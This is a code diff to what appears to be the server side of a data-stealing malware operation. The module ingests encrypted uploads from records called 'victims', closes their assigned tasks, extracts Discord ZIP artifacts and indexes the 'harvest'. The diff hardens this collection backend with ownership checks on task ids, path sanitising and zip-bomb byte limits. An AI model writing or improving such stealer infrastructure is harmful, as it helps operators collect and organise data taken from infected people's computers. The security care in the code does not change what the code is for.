@@ -1,9 +1,9 @@
 import { createDecipheriv, createHash, randomUUID } from 'node:crypto';
 import AdmZip from 'adm-zip';
 import { createReadStream, createWriteStream } from 'node:fs';
-import { mkdir, open, readFile, rename, stat, writeFile, type FileHandle } from 'node:fs/promises';
+import { mkdir, open, readFile, rename, rm, stat, writeFile, type FileHandle } from 'node:fs/promises';
 import { pipeline } from 'node:stream/promises';
-import { Transform } from 'node:stream';
+import { Readable, Transform } from 'node:stream';
 import { createInflateRaw } from 'node:zlib';
 import { basename, dirname, join, normalize, sep } from 'node:path';
 import type { Artifact, Upload, Victim } from '@prisma/client';
@@ -17,7 +17,7 @@ export const uploadDir = (id: string) => join(env.STORAGE_DIR, 'uploads', `${id}
 export const artifactDir = (id: string) => join(env.STORAGE_DIR, 'artifacts', id);
 
 export function safeRel(path: string): string {
-  const clean = normalize(path.replace(/\\/g, '/').replace(/^[A-Za-z]:/, ''))
+  const clean = normalize(path.replace(/\0/g, '').replace(/\\/g, '/').replace(/^[A-Za-z]:/, ''))
     .split(/[\\/]+/)
     .filter((part) => part && part !== '.' && part !== '..')
     .join(sep);
@@ -36,10 +36,15 @@ export async function initUpload(
   const path = uploadDir(randomUUID());
   await mkdir(dirname(path), { recursive: true });
   await writeFile(path, Buffer.alloc(0));
+  // A stale or forged task id must never let this artifact close a foreign
+  // task: link only when the task still belongs to the signing victim.
+  const taskId = input.taskId
+    ? (await prisma.task.findFirst({ where: { id: input.taskId, victimId: victim.id }, select: { id: true } }))?.id ?? null
+    : null;
   const upload = await prisma.upload.create({
     data: {
       victimId: victim.id,
-      taskId: input.taskId,
+      taskId,
       module: input.module,
       totalSize: input.totalSize,
       chunkCount: input.chunkCount,
@@ -136,7 +141,9 @@ async function closeTaskFromArtifact(artifact: Artifact): Promise<void> {
     const current = task.result as Record<string, unknown> | null;
     const result = current && typeof current.upload_id === 'string'
       ? current
-      : { artifactId: artifact.id, http_result: true };
+      // Even if every result path dies, the closing artifact stays reachable
+      // and a later real body replaces this placeholder.
+      : { artifactId: artifact.id, ...(artifact.uploadId ? { upload_id: artifact.uploadId } : {}), http_result: true };
     await prisma.task.update({
       where: { id: task.id },
       data: { status: 'done', result: result as never, finishedAt: new Date(), leaseUntil: null }
@@ -181,7 +188,8 @@ async function decipherBlob(
   aad: Buffer,
   dest: string,
   expectedSha: string,
-  expectedSize: number
+  expectedSize: number,
+  maxBytes: number
 ): Promise<void> {
   const decipher = createDecipheriv('aes-256-gcm', key, nonce);
   decipher.setAAD(aad);
@@ -197,8 +205,12 @@ async function decipherBlob(
   let size = 0;
   const meter = new Transform({
     transform(chunk, _encoding, callback) {
-      digest.update(chunk);
       size += chunk.length;
+      if (size > maxBytes) {
+        callback(new Error('blob_too_large'));
+        return;
+      }
+      digest.update(chunk);
       callback(null, chunk);
     }
   });
@@ -250,6 +262,7 @@ export async function processArtifact(artifactId: string): Promise<void> {
       const root = artifactDir(artifact.id);
       await mkdir(root, { recursive: true });
       if (manifest.artifacts.length > 20000) throw new Error('too_many_entries');
+      const cap = env.MAX_ARTIFACT_MB * 1024 * 1024;
       let extracted = 0;
       const seen = new Set<string>();
 
@@ -261,6 +274,10 @@ export async function processArtifact(artifactId: string): Promise<void> {
         if (tag !== 'BLOB' || !id || !lengthText) throw new Error('blob_header_invalid');
         const length = Number(lengthText);
         if (!Number.isInteger(length) || length < 17) throw new Error('blob_length_invalid');
+        const remaining = cap - extracted;
+        // Declared sizes bound the fast path; the streaming meter still stops
+        // a manifest that lies, so a bomb cannot fill the disk before failing.
+        if (item.size > remaining) throw new Error('artifact_unpacked_too_large');
         const tagBytes = Buffer.alloc(16);
         await fd.read(tagBytes, 0, 16, cursor + length - 16);
         cursor += length;
@@ -270,9 +287,19 @@ export async function processArtifact(artifactId: string): Promise<void> {
         await mkdir(dirname(dest), { recursive: true });
         const nonce = Buffer.concat([noncePrefix, Buffer.alloc(4)]);
         nonce.writeUInt32BE(index, 8);
-        await decipherBlob(artifact.containerPath, cursor - length, length, key, nonce, Buffer.from(`${expected}:${id}`), dest, item.sha256, item.size);
+        await decipherBlob(
+          artifact.containerPath,
+          cursor - length,
+          length,
+          key,
+          nonce,
+          Buffer.from(`${expected}:${id}`),
+          dest,
+          item.sha256,
+          item.size,
+          remaining
+        );
         extracted += item.size;
-        if (extracted > env.MAX_ARTIFACT_MB * 1024 * 1024) throw new Error('artifact_unpacked_too_large');
       }
 
       await prisma.artifact.update({
@@ -331,6 +358,44 @@ async function recordArtifactFailure(victimId: string, artifactId: string, messa
   }).catch(() => undefined);
 }
 
+/**
+ * Inflate one ZIP entry to disk with a hard byte ceiling. AdmZip's header size
+ * is only a hint, so the meter is what actually bounds a lying or bomb entry.
+ */
+async function inflateEntry(
+  entry: { header: { method: number }; getCompressedData(): Buffer },
+  dest: string,
+  maxBytes: number
+): Promise<{ size: number; sha256: string }> {
+  const digest = createHash('sha256');
+  let size = 0;
+  const raw = entry.getCompressedData();
+  if (entry.header.method === 0) {
+    if (raw.length > maxBytes) throw new Error('artifact_unpacked_too_large');
+    digest.update(raw);
+    await writeFile(dest, raw, { mode: 0o600 });
+    return { size: raw.length, sha256: digest.digest('hex') };
+  }
+  const meter = new Transform({
+    transform(chunk, _encoding, callback) {
+      size += chunk.length;
+      if (size > maxBytes) {
+        callback(new Error('artifact_unpacked_too_large'));
+        return;
+      }
+      digest.update(chunk);
+      callback(null, chunk);
+    }
+  });
+  try {
+    await pipeline(Readable.from(raw), createInflateRaw(), meter, createWriteStream(dest, { mode: 0o600 }));
+  } catch (error) {
+    await rm(dest, { force: true });
+    throw error;
+  }
+  return { size, sha256: digest.digest('hex') };
+}
+
 async function readLine(fd: Awaited<ReturnType<typeof open>>, at: number): Promise<{ text: string; bytes: number }> {
   const chunks: Buffer[] = [];
   let total = 0;
@@ -368,19 +433,23 @@ async function processDiscordArtifact(artifact: Artifact): Promise<void> {
   if (name.endsWith('.zip')) {
     const zip = new AdmZip(artifact.containerPath);
     const entries = zip.getEntries().filter((entry) => !entry.isDirectory).slice(0, 20000);
+    const cap = env.MAX_ARTIFACT_MB * 1024 * 1024;
     let index = 0;
     let total = 0;
     for (const entry of entries) {
       const rel = safeRel(entry.entryName);
-      const size = Number(entry.header.size ?? 0);
-      if (size <= 0 || size > 64 * 1024 * 1024) continue;
-      if (total + size > env.MAX_ARTIFACT_MB * 1024 * 1024) break;
-      const data = entry.getData();
-      total += data.length;
+      const declared = Number(entry.header.size ?? 0);
+      if (declared <= 0 || declared > cap) continue;
+      if (total + declared > cap) break;
       const dest = join(root, rel);
       await mkdir(dirname(dest), { recursive: true });
-      await writeFile(dest, data);
-      manifest.artifacts.push({ id: `e${++index}`, path: rel, kind: rel.toLowerCase().endsWith('.json') ? 'json' : 'file', size: data.length, sha256: sha256hex(data) });
+      const { size, sha256 } = await inflateEntry(entry, dest, cap - total);
+      if (size <= 0) {
+        await rm(dest, { force: true });
+        continue;
+      }
+      total += size;
+      manifest.artifacts.push({ id: `e${++index}`, path: rel, kind: rel.toLowerCase().endsWith('.json') ? 'json' : 'file', size, sha256 });
     }
     await indexHarvest(artifact.victimId, artifact.id, manifest.artifacts.map((item) => item.path), root);
     for (const item of manifest.artifacts) {
